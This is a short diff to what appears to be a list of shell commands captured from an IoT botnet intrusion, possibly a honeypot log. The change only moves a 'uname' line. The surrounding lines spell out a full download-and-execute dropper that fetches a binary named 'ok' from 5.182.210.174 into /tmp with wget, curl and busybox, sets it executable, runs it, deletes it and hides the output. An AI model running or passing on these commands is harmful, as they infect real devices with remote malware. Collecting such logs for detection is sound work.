@@ -41,6 +41,7 @@ uname -a
 exit
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
 ./ok
+/bin/./uname -s -v -n -r -m
 /userfs/bin/wget http://5.182.210.174/ok
 busybox curl -O http://5.182.210.174/ok
 busybox sh ok
@@ -51,7 +52,6 @@ chmod +x ok
 chmod 777 ok
 rm -rf ok
 rm -rf ok.1
-/bin/./uname -s -v -n -r -m
 za
 zalee
 echo SHELL_TEST
